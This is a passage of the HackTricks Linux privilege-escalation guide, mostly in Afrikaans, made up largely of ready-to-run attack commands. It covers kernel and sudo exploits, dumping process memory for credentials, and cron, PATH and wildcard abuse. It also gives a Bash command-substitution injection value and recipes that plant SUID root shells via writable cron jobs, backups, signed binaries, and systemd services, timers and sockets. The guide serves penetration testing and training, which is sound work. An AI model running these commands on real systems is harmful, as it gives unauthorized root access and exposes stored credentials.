# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Stelselinligting

### OS-inligting

Kom ons begin om kennis op te doen oor die OS wat aan die gang is
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Pad

As jy **skryfregte op enige gids binne die `PATH`-veranderlike** het, kan jy moontlik sommige libraries of binaries hijack:
```bash
echo $PATH
```
### Omgewingsinligting

Is daar interessante inligting, wagwoorde of API-sleutels in die omgewingsveranderlikes?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kontroleer die kernel version en kyk of daar 'n exploit bestaan wat gebruik kan word om escalate privileges.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Jy kan 'n goeie lys van kwesbare kernel-weergawes en sommige reeds **compiled exploits** hier vind: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) en [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Ander webwerwe waar jy sommige **compiled exploits** kan vind: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Om al die kwesbare kernel-weergawes vanaf daardie web te onttrek, kan jy doen:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Gereedskap wat kan help om na kernel exploits te soek, is:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Moet altyd **soek die kernel version in Google**, dalk is jou kernel version in 'n kernel exploit geskryf en dan sal jy seker wees dat hierdie exploit geldig is.

Bykomende kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo weergawe

Gebaseer op die kwesbare sudo-weergawes wat verskyn in:
```bash
searchsploit sudo
```
Jy kan nagaan of die sudo-weergawe kwesbaar is deur hierdie grep te gebruik.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo versions before 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) laat onbevoegde plaaslike gebruikers toe om root-voorregte te verkry via die sudo `--chroot`-opsie wanneer die `/etc/nsswitch.conf`-lêer vanaf 'n deur die gebruiker beheerde gids gebruik word.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Van @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg-handtekeningverifikasie het misluk

Kyk na **smasher2 box of HTB** vir 'n **voorbeeld** van hoe hierdie vuln uitgebruik kan word
```bash
dmesg 2>/dev/null | grep "signature"
```
### Meer stelselenumerasie
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Lys moontlike verdedigings

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

As jy binne 'n container is, begin met die volgende container-security afdeling en skuif dan na die runtime-specific abuse pages:


{{#ref}}
container-security/
{{#endref}}

## Skywe

Kontroleer **what is mounted and unmounted**, waar en waarom. As iets unmounted is, kan jy probeer om dit te mount en kyk vir privaat inligting
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nuttige sagteware

Lys nuttige binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Kontroleer ook of **enige compiler geïnstalleer is**. Dit is nuttig as jy 'n kernel exploit moet gebruik, aangesien dit aanbeveel word om dit op die masjien waar jy dit gaan gebruik te compileer (of op 'n soortgelyke masjien).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Geïnstalleerde kwesbare sagteware

Kyk na die **weergawe van die geïnstalleerde pakkette en dienste**. Miskien is daar ’n ou Nagios-weergawe (byvoorbeeld) wat uitgebuit kan word om escalating privileges…\
Daar word aanbeveel om die weergawe van die meer verdagte geïnstalleerde sagteware handmatig te kontroleer.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Let op dat hierdie opdragte baie inligting sal vertoon wat meestal nutteloos sal wees, daarom word aanbeveel om toepassings soos OpenVAS of soortgelykes te gebruik wat sal nagaan of enige geïnstalleerde sagtewareweergawe kwesbaar is vir bekende exploits_

## Processes

Kyk na **watter prosesse** uitgevoer word en kontroleer of enige proses **meer voorregte het as wat dit behoort te hê** (miskien 'n tomcat wat deur root uitgevoer word?)
```bash
ps aux
ps -ef
top -n 1
```
Kontroleer altyd vir moontlike [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** identifiseer dit deur die `--inspect` parameter in die command line van die proses te kontroleer.\
Ook **kontroleer jou bevoegdhede oor die proses se binaries**, dalk kan jy iemand oorskryf.

### Prosessmonitering

Jy kan gereedskap soos [**pspy**](https://github.com/DominicBreuker/pspy) gebruik om prosesse te monitor. Dit kan baie nuttig wees om kwesbare prosesse te identifiseer wat gereeld uitgevoer word of wanneer 'n stel vereistes vervul is.

### Prosesgeheue

Sommige dienste op 'n bediener stoor **credentials in clear text inside the memory**.\
Gewoonlik sal jy **root privileges** nodig hê om die geheue van prosesse wat aan ander gebruikers behoort te lees, daarom is dit gewoonlik meer nuttig wanneer jy reeds root is en meer credentials wil ontdek.\
Onthou egter dat **as 'n gewone gebruiker jy die geheue van die prosesse wat jy besit kan lees**.

> [!WARNING]
> Neem kennis dat deesdae die meeste masjiene **don't allow ptrace by default** wat beteken dat jy nie ander prosesse wat aan jou ongemagtigde gebruiker behoort kan dump nie.
>
> Die lêer _**/proc/sys/kernel/yama/ptrace_scope**_ beheer die toeganklikheid van ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle prosesse kan gedebug word, solank hulle dieselfde uid het. Dit is die klassieke wyse waarop ptracing gewerk het.
> - **kernel.yama.ptrace_scope = 1**: slegs 'n ouerproses kan gedebug word.
> - **kernel.yama.ptrace_scope = 2**: Slegs admin kan ptrace gebruik, aangesien dit die CAP_SYS_PTRACE capability vereis.
> - **kernel.yama.ptrace_scope = 3**: Geen prosesse mag met ptrace getraceer word nie. Sodra dit gestel is, is 'n herbegin benodig om ptracing weer te aktiveer.

#### GDB

As jy toegang tot die geheue van 'n FTP-diens (byvoorbeeld) het, kan jy die Heap kry en daarin na sy credentials soek.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Vir 'n gegewe proses-ID, **wys maps hoe geheue binne daardie proses se virtuele adresruimte gekarteer is**; dit toon ook die **toestemmings van elke gemapte gebied**. Die **mem** pseudo-lêer **stel die proses se geheue self bloot**. Uit die **maps**-lêer weet ons watter **geheuegebiede leesbaar is** en hul offsets. Ons gebruik hierdie inligting om **in die mem-lêer te seek en alle leesbare gebiede na 'n lêer te dump**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bied toegang tot die stelsel se **fisiese** geheue, nie die virtuele geheue nie. Die kernel se virtuele adresruimte kan benader word met /dev/kmem.\

Gewoonlik is `/dev/mem` slegs leesbaar deur **root** en die **kmem** groep.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump is 'n herontwerp vir Linux van die klassieke ProcDump-gereedskap uit die Sysinternals-suite vir Windows. Kry dit by [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Gereedskap

Om die prosesgeheue te dump kan jy gebruik:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Jy kan handmatig die root-vereistes verwyder en die proses wat aan jou behoort dump
- Script A.5 van [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is vereis)

### Kredensiale uit prosesgeheue

#### Handmatige voorbeeld

As jy sien dat die authenticator-proses aan die gang is:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Jy kan dump the process (sien vorige afdelings om verskillende maniere te vind om die memory van 'n process te dump) en soek na credentials in die memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Die tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sal **duidelike teks-inlogbewyse uit geheue steel** en uit sommige **bekende lêers**. Dit vereis root-bevoegdhede om behoorlik te werk.

| Funksie                                           | Prosesnaam           |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Soek Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplande/Cron jobs

### Crontab UI (alseambusher) wat as root loop – web-based scheduler privesc

Indien 'n web “Crontab UI” paneel (alseambusher/crontab-ui) as root loop en slegs aan loopback gebind is, kan jy dit steeds via SSH local port-forwarding bereik en 'n privileged job skep om te escalate.

Tipiese ketting
- Ontdek slegs-loopback-poort (bv., 127.0.0.1:8000) en Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- Soek credentials in operational artifacts:
- Backups/scripts met `zip -P <password>`
- systemd unit blootstellend `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel en login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Skep ’n high-priv job en voer dit onmiddellik uit (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Gebruik dit:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Moet nie Crontab UI as root laat loop nie; beperk dit tot 'n toegewyde gebruiker en minimale toestemmings
- Bind aan localhost en beperk toegang verder via firewall/VPN; moenie wagwoorde hergebruik nie
- Vermy om secrets in unit files in te bak; gebruik secret stores of root-only EnvironmentFile
- Skakel audit/logging in vir op-aanvraag taakuitvoerings

Kontroleer of enige geskeduleerde taak kwesbaar is. Miskien kan jy voordeel trek uit 'n skrip wat deur root uitgevoer word (wildcard vuln? kan jy lêers wysig wat root gebruik? gebruik symlinks? skep spesifieke lêers in die gids wat root gebruik?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Byvoorbeeld, in _/etc/crontab_ kan jy die PATH vind: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Let daarop dat die gebruiker "user" skryfregte oor /home/user het_)

As in hierdie crontab die root-gebruiker probeer om 'n opdrag of script uit te voer sonder om die PATH te stel. Byvoorbeeld: _\* \* \* \* root overwrite.sh_\
Dan kan jy 'n root shell kry deur:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron wat 'n script met 'n wildcard gebruik (Wildcard Injection)

As 'n script wat deur root uitgevoer word 'n “**\***” in 'n command het, kan jy dit uitbuit om onverwagte dinge te veroorsaak (soos privesc). Voorbeeld:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**As die wildcard voorafgegaan word deur 'n pad soos** _**/some/path/***_**, is dit nie kwesbaar nie (selfs** _**./***_ **is nie).**

Lees die volgende bladsy vir meer wildcard-exploitasie truuks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash voer parameter expansion en command substitution uit voor arithmetic evaluation in ((...)), $((...)) en let. As 'n root cron/parser onbetroubare logvelde lees en dit in 'n rekenkundige konteks invoer, kan 'n aanvaller 'n command substitution $(...) injekteer wat as root uitgevoer word wanneer die cron loop.

- Hoekom dit werk: In Bash gebeur expansions in hierdie volgorde: parameter/variable expansion, command substitution, arithmetic expansion, dan word splitting en pathname expansion. Dus word 'n waarde soos `$(/bin/bash -c 'id > /tmp/pwn')0` eers vervang (die opdrag word uitgevoer), en daarna word die oorblywende numeriese `0` vir die berekening gebruik sodat die skrip sonder foute voortgaan.

- Tipiese kwesbare patroon:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Eksploitasie: Kry deur die aanvaller beheerde teks in die geparsde log geskryf sodat die numeries-lykende veld 'n command substitution bevat en op 'n syfer eindig. Maak seker jou opdrag skryf nie na stdout nie (of herlei dit) sodat die rekenkundige uitdrukking geldig bly.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script oorskrywing en symlink
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
As die script wat deur root uitgevoer word 'n **directory waarop jy volle toegang het** gebruik, kan dit nuttig wees om daardie folder te verwyder en **'n symlink folder na 'n ander een te skep** wat 'n script bevat wat deur jou beheer word.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink-validasie en veiliger lêerhantering

Wanneer jy bevoorregte skripte/binaries hersien wat lêers per pad lees of skryf, verifieer hoe skakels hanteer word:

- `stat()` volg 'n symlink en gee metadata van die teiken terug.
- `lstat()` gee metadata van die skakel self terug.
- `readlink -f` en `namei -l` help om die finale teiken op te los en wys die toestemmings van elke padkomponent.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Vir verdedigers/ontwikkelaars, veiliger patrone teen symlink-truuks sluit in:

- `O_EXCL` with `O_CREAT`: faal as die pad reeds bestaan (blokkeer aanvaller se vooraf-geskepte links/files).
- `openat()`: werk relatief tot 'n vertroude directory file descriptor.
- `mkstemp()`: skep tydelike lêers atomies met veilige permissies.

### Custom-ondertekende cron binaries met skryfbare payloads
Blue teams teken soms cron-driven binaries deur 'n custom ELF-seksie te dump en te grep vir 'n vendor string voordat hulle dit as root uitvoer. As daardie binary group-writable is (bv. `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) en jy kan die signing material leak, kan jy die seksie forge en die cron taak kaapslaan:

1. Gebruik `pspy` om die verifikasievloei vas te vang. In Era het root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` gevolg deur `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` en toe die lêer uitgevoer.
2. Hermaak die verwagte sertifikaat met die leaked key/config (van `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Bou 'n kwaadwillige vervanging (bv. drop 'n SUID bash, voeg jou SSH key by) en embed die sertifikaat in `.text_sig` sodat die grep slaag:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Oorskryf die geskeduleerde binary terwyl jy die execute bits behou:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wag vir die volgende cron-run; sodra die naïewe signature check slaag, word jou payload as root uitgevoer.

### Gereelde cron-jobs

Jy kan die prosesse monitor om te soek na prosesse wat elke 1, 2 of 5 minute uitgevoer word. Miskien kan jy dit benut en jou privileges op te skaal.

Byvoorbeeld, om **elke 0.1s vir 1 minuut te monitor**, **sorteer op minder uitgevoerde kommando's** en verwyder die kommando's wat die meeste uitgevoer is, kan jy:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Jy kan ook gebruik** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dit sal elke proses wat begin, monitor en lys).

### Root-rugsteun wat aanvaller-gestelde mode bits bewaar (pg_basebackup)

Indien 'n root-beheerde cron `pg_basebackup` (of enige rekursiewe kopie) teen 'n databasisgids wat jy kan skryf, omsluit, kan jy 'n **SUID/SGID binary** plant wat in die rugsteunuitset as **root:root** met dieselfde mode bits hergekopieer sal word.

Tipiese ontdekkingsvloei (as 'n lae-priv DB-gebruiker):
- Gebruik `pspy` om 'n root cron te sien wat iets soos `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` elke minuut aanroep.
- Bevestig dat die bron-kluster (bv. `/var/lib/postgresql/14/main`) deur jou geskryf kan word en dat die bestemming (`/opt/backups/current`) ná die taak aan root behoort.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Dit werk omdat `pg_basebackup` lêermodus-bits bewaar wanneer dit die cluster kopieer; wanneer dit deur root aangeroep word, erf die bestemmingslêers **root ownership + attacker-chosen SUID/SGID**. Enige soortgelyke geprivilegieerde backup/kopieer-roetine wat permissies behou en in 'n uitvoerbare ligging skryf, is kwesbaar.

### Onsigbare cron jobs

Dit is moontlik om 'n cronjob te skep deur **'n carriage return na 'n kommentaar te plaas** (sonder newline character), en die cron job sal werk. Voorbeeld (let op die carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Skryfbare _.service_ lêers

Kontroleer of jy enige `.service` lêer kan skryf; as jy dit kan, kan jy dit **wysig** sodat dit jou **backdoor uitvoer wanneer** die diens **gestart**, **herbegin** of **gestop** word (miskien sal jy moet wag totdat die masjien herbegin).\
Byvoorbeeld, skep jou backdoor binne die .service lêer met **`ExecStart=/tmp/script.sh`**

### Skryfbare service binaries

Onthou dat as jy **skryfpermissies oor binaries wat deur services uitgevoer word** het, jy hulle kan verander om backdoors in te voeg sodat wanneer die services weer uitgevoer word die backdoors uitgevoer sal word.

### systemd PATH - Relatiewe Paaie

Jy kan die PATH wat deur **systemd** gebruik word sien met:
```bash
systemctl show-environment
```
As jy uitvind dat jy in enige van die vouers van die pad kan **write**, mag jy moontlik in staat wees om **escalate privileges**. Jy moet soek na **relative paths being used on service configurations** lêers soos:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Skep dan 'n **uitvoerbare lêer** met presies dieselfde naam as die **relatiewe pad-binary** binne die systemd PATH-lêergids wat jy kan skryf, en wanneer die diens gevra word om die kwesbare aksie uit te voer (**Start**, **Stop**, **Reload**), sal jou **backdoor** uitgevoer word (onbevoorregte gebruikers kan gewoonlik nie dienste start/stop nie, maar kyk of jy `sudo -l` kan gebruik).

**Leer meer oor dienste met `man systemd.service`.**

## **Timers**

**Timers** is systemd-unitlêers waarvan die naam eindig op `**.timer**` wat `**.service**`-lêers of gebeurtenisse beheer. **Timers** kan as 'n alternatief vir cron gebruik word aangesien hulle ingeboude ondersteuning het vir kalendertydgebeure en monotone tydgebeure en asynchroon uitgevoer kan word.

Jy kan al die timers lys met:
```bash
systemctl list-timers --all
```
### Skryfbare timers

As jy 'n timer kan wysig, kan jy dit laat 'n bestaande systemd.unit uitvoer (soos 'n `.service` of 'n `.target`)
```bash
Unit=backdoor.service
```
In die dokumentasie kan jy lees wat die Unit is:

> Die unit wat geaktiveer word wanneer hierdie timer verstryk. Die argument is 'n unit-naam, waarvan die sufiks nie ".timer" is nie. Indien dit nie gespesifiseer word nie, val hierdie waarde standaard terug op 'n service wat dieselfde naam as die timer unit het, behalwe vir die sufiks. (Sien hierbo.) Dit word aanbeveel dat die unit-naam wat geaktiveer word en die unit-naam van die timer unit identies genoem word, behalwe vir die sufiks.

Daarom, om hierdie toestemming te misbruik, moet jy:

- Vind 'n systemd unit (soos 'n `.service`) wat **'n skryfbare binêre uitvoer**
- Vind 'n systemd unit wat **'n relatiewe pad uitvoer** en jy het **skryfregte** oor die **systemd PATH** (om daardie uitvoerbare te imiteer)

**Leer meer oor timers met `man systemd.timer`.**

### **Aktivering van timer**

Om 'n timer te aktiveer benodig jy root-regte en om die volgende uit te voer:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **proseskommunikasie** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Skryfbare .socket lêers

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Socket-aktivering + skryfbare unit-pad (skep ontbrekende service)

Another high-impact misconfiguration is:

- 'n socket unit with `Accept=no` and `Service=<name>.service`
- the referenced service unit is missing
- an attacker can write into `/etc/systemd/system` (or another unit search path)

In that case, the attacker can create `<name>.service`, then trigger traffic to the socket so systemd loads and executes the new service as root.

Kort vloei:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Skryfbare sockets

As jy **enige skryfbare socket identifiseer** (_nou praat ons oor Unix Sockets en nie oor die config `.socket` lêers nie_), dan **kan jy kommunikeer** met daardie socket en dalk exploit a vulnerability.
```bash
netstat -a -p --unix
```
### Ruwe verbinding
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Voorbeeld van uitbuiting:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Neem kennis dat daar dalk 'n paar **sockets listening for HTTP** versoeke is (_Ek praat nie oor .socket files nie maar oor files wat as unix sockets optree_). Jy kan dit nagaan met:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
As die socket **met 'n HTTP-versoek reageer**, kan jy daarmee kommunikeer en dalk 'n kwesbaarheid uitbuit.

### Skryfbare Docker Socket

